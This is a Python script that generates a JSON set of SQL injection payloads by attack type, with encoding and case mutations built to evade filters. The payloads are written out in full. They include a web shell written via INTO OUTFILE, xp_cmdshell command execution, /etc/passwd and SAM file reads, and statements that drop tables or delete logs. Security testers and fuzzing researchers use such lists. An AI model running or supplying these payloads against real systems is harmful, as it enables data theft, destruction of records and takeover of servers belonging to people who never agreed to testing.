#!/usr/bin/env python3
"""
Payload Generator - OWASP-inspired SQL Injection Payloads
Generates base payloads with multiple encoding variants
"""

import json
import base64
import urllib.parse
import argparse
from typing import List, Dict
import random
import string


class PayloadGenerator:
    """Generate SQL injection payloads with variants"""
    
    def __init__(self, min_base: int = 200, variants_per_base: int = 5):
        self.min_base = min_base
        self.variants_per_base = variants_per_base
        self.payload_counter = 0
        
    def get_base_payloads(self) -> List[Dict]:
        """Return comprehensive list of base SQL injection payloads"""
        
        payloads = []
        
        # Boolean-based blind
        boolean_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' OR '1'='1",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'#",
            "' OR 'x'='x",
            "' OR 'something'='something",
            "1' OR '1'='1",
            "1' OR 1=1",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "' OR ''='",
            "' OR 1--",
            "' OR 1#",
            "1' AND '1'='1",
            "1 AND 1=1",
            "1' AND 1=1--",
            ") OR ('1'='1",
            ") OR (1=1",
            "')) OR (('1'='1",
            "')) OR ((1=1",
            "' OR 'a'='a",
            "' OR a=a--",
            "1 OR 1=1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR '1'='1' AND ''='",
            "' OR 1=1 AND ''='",
            "1' OR '1'='1' LIMIT 1--",
            "1 OR 1=1 LIMIT 1",
        ]
        
        # UNION-based
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 'a','b','c'--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "-1 UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "1' UNION SELECT @@version,NULL,NULL--",
            "1' UNION SELECT database(),user(),version()--",
            "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",
            "' UNION SELECT NULL,NULL,load_file('/etc/passwd')--",
            "' UNION SELECT * FROM (SELECT NULL,NULL,NULL)a--",
            "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/shell.php'--",
            "999' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' UNION SELECT NULL,NULL,NULL WHERE 1=2--",
        ]
        
        # Error-based
        error_payloads = [
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CAST(@@version AS int)--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            "' AND exp(~(SELECT * FROM (SELECT 1)a))--",
            "' OR 1=1 AND row(1,1)>(SELECT COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x LIMIT 1)--",
            "' AND gtid_subset(version(),1)--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',version())) USING utf8)))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
            "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand()*2)) HAVING MIN(0)--",
            "' AND multipoint((select * from (select * from (select version())a)b))--",
            "' OR polygon((select * from(select * from(select version())a)b))--",
            "' AND geometrycollection((select*from(select user())a))--",
            "' AND ST_LatFromGeoHash(version())--",
        ]
        
        # Time-based blind
        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR SLEEP(5)#",
            "1' AND SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "'; WAITFOR DELAY '0:0:5'--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' OR BENCHMARK(5000000,MD5('A'))--",
            "1' OR BENCHMARK(5000000,MD5('A'))--",
            "' OR pg_sleep(5)--",
            "1' OR pg_sleep(5)--",
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "1' OR IF(1=1,SLEEP(5),0)--",
            "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
            "' OR (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
        ]
        
        # Stacked queries
        stacked_payloads = [
            "'; DROP TABLE users--",
            "1'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','pass')--",
            "'; UPDATE users SET password='hacked'--",
            "'; EXEC sp_configure 'show advanced options',1--",
            "'; EXEC sp_configure 'xp_cmdshell',1--",
            "'; EXEC master..xp_cmdshell 'whoami'--",
            "1'; SELECT * INTO OUTFILE '/tmp/out.txt'--",
            "'; CREATE TABLE hacked(data varchar(100))--",
            "'; DELETE FROM logs--",
            "1'; ALTER TABLE users ADD COLUMN hacked INT--",
        ]
        
        # Blind injection (inference)
        blind_payloads = [
            "' AND SUBSTRING(version(),1,1)='5'--",
            "' AND SUBSTRING(user(),1,1)='r'--",
            "' AND ASCII(SUBSTRING(database(),1,1))>100--",
            "' AND LENGTH(database())>5--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
            "1' AND MID(version(),1,1)='5",
            "1' AND CHAR(65)='A",
            "1' AND SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END",
        ]
        
        # Header injection
        header_payloads = [
            "' OR '1'='1' --",
            "127.0.0.1' OR '1'='1",
            "admin' OR 1=1--",
            "' UNION SELECT password FROM users WHERE username='admin'--",
            "Mozilla' OR '1'='1",
            "en-US' OR 1=1--",
        ]
        
        # Path traversal / injection
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "' OR '1'='1",
            "1' OR '1'='1",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
        ]
        
        # Build comprehensive list
        all_bases = []
        
        for cat, payloads_list in [
            ("boolean", boolean_payloads),
            ("union", union_payloads),
            ("error", error_payloads),
            ("time-based", time_payloads),
            ("stacked", stacked_payloads),
            ("blind", blind_payloads),
            ("header-injection", header_payloads),
            ("path-injection", path_payloads),
        ]:
            for payload in payloads_list:
                all_bases.append({
                    "base_payload": payload,
                    "attack_type": cat,
                })
        
        # Expand to min_base if needed
        while len(all_bases) < self.min_base:
            # Generate additional variations
            template = random.choice(all_bases)
            new_payload = self._mutate_payload(template["base_payload"])
            all_bases.append({
                "base_payload": new_payload,
                "attack_type": template["attack_type"],
            })
        
        return all_bases[:self.min_base]
    
    def _mutate_payload(self, payload: str) -> str:
        """Create a mutation of existing payload"""
        mutations = [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("OR", "Or"),
            lambda p: p.replace("SELECT", "SeLeCt"),
            lambda p: p.replace("UNION", "UnIoN"),
            lambda p: p + " AND 1=1",
            lambda p: p.replace("--", "#"),
            lambda p: f"({p})",
            lambda p: p.replace("=", " LIKE "),
        ]
        
        mutation = random.choice(mutations)
        try:
            return mutation(payload)
        except:
            return payload
    
    def generate_variants(self, base_payload: str) -> List[str]:
        """Generate encoding variants for a payload"""
        variants = []
        
        # URL encode
        try:
            variants.append(urllib.parse.quote(base_payload))
        except:
            pass
        
        # Double URL encode
        try:
            variants.append(urllib.parse.quote(urllib.parse.quote(base_payload)))
        except:
            pass
        
        # Base64
        try:
            variants.append(base64.b64encode(base_payload.encode()).decode())
        except:
            pass
        
        # Hex encoding
        try:
            hex_encoded = ''.join([f'%{ord(c):02x}' for c in base_payload])
            variants.append(hex_encoded)
        except:
            pass
        
        # Comment insertion
        try:
            commented = base_payload.replace(" ", "/**/")
            variants.append(commented)
        except:
            pass
        
        # Case obfuscation
        try:
            case_obf = ''.join([c.upper() if random.random() > 0.5 else c.lower() 
                                for c in base_payload])
            variants.append(case_obf)
        except:
            pass
        
        # Whitespace variations
        try:
            ws_variants = [
                base_payload.replace(" ", "\t"),
                base_payload.replace(" ", "\n"),
                base_payload.replace(" ", "+"),
                base_payload.replace(" ", "%20"),
            ]
            variants.extend(ws_variants)
        except:
            pass
        
        # Null byte injection
        try:
            variants.append(base_payload + "%00")
        except:
            pass
        
        # Pick random subset
        random.shuffle(variants)
        return variants[:self.variants_per_base]
    
    def generate_example_param(self, attack_type: str) -> str:
        """Generate appropriate parameter name for attack type"""
        param_map = {
            "boolean": random.choice(["q", "search", "username", "id", "user"]),
            "union": random.choice(["id", "product_id", "page", "item"]),
            "error": random.choice(["id", "category", "filter"]),
            "time-based": random.choice(["id", "user_id", "query"]),
            "stacked": random.choice(["id", "command", "action"]),
            "blind": random.choice(["id", "search", "username"]),
            "header-injection": random.choice(["X-Forwarded-For", "User-Agent", "Referer"]),
            "path-injection": random.choice(["file", "path", "document"]),
        }
        return param_map.get(attack_type, "q")
    
    def generate_all(self) -> List[Dict]:
        """Generate complete payload database"""
        base_payloads = self.get_base_payloads()
        all_payloads = []
        
        for base in base_payloads:
            payload_id = f"p{self.payload_counter:04d}"
            self.payload_counter += 1
            
            variants = self.generate_variants(base["base_payload"])
            
            payload_entry = {
                "payload_id": payload_id,
                "base_payload": base["base_payload"],
                "attack_type": base["attack_type"],
                "variants": variants,
                "example_param": self.generate_example_param(base["attack_type"]),
            }
            
            all_payloads.append(payload_entry)
        
        return all_payloads
    
    def save_to_file(self, payloads: List[Dict], output_path: str):
        """Save payloads to JSON file"""
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, indent=2, ensure_ascii=False)
        
        print(f"✓ Saved {len(payloads)} base payloads to {output_path}")
    
    def print_stats(self, payloads: List[Dict]):
        """Print generation statistics"""
        total_variants = sum(len(p["variants"]) for p in payloads)
        attack_types = {}
        
        for p in payloads:
            attack_type = p["attack_type"]
            attack_types[attack_type] = attack_types.get(attack_type, 0) + 1
        
        print("\n" + "="*60)
        print("PAYLOAD GENERATION STATISTICS")
        print("="*60)
        print(f"Total base payloads:     {len(payloads)}")
        print(f"Total variants:          {total_variants}")
        print(f"Avg variants per base:   {total_variants/len(payloads):.1f}")
        print("\nBreakdown by attack type:")
        for attack_type, count in sorted(attack_types.items()):
            print(f"  {attack_type:20s}: {count:4d}")
        print("="*60 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Generate SQL injection payloads with variants"
    )
    parser.add_argument(
        "--min-base",
        type=int,
        default=200,
        help="Minimum number of base payloads (default: 200)"
    )
    parser.add_argument(
        "--variants-per-base",
        type=int,
        default=5,
        help="Number of variants per base payload (default: 5)"
    )
    parser.add_argument(
        "--output",
        default="recon/payloads.json",
        help="Output JSON file path (default: recon/payloads.json)"
    )
    
    args = parser.parse_args()
    
    print(f"\n🔧 Generating payloads...")
    print(f"   Min base payloads: {args.min_base}")
    print(f"   Variants per base: {args.variants_per_base}\n")
    
    generator = PayloadGenerator(
        min_base=args.min_base,
        variants_per_base=args.variants_per_base
    )
    
    payloads = generator.generate_all()
    generator.save_to_file(payloads, args.output)
    generator.print_stats(payloads)
    
    print("✓ Payload generation completed successfully!")


if __name__ == "__main__":
    main()
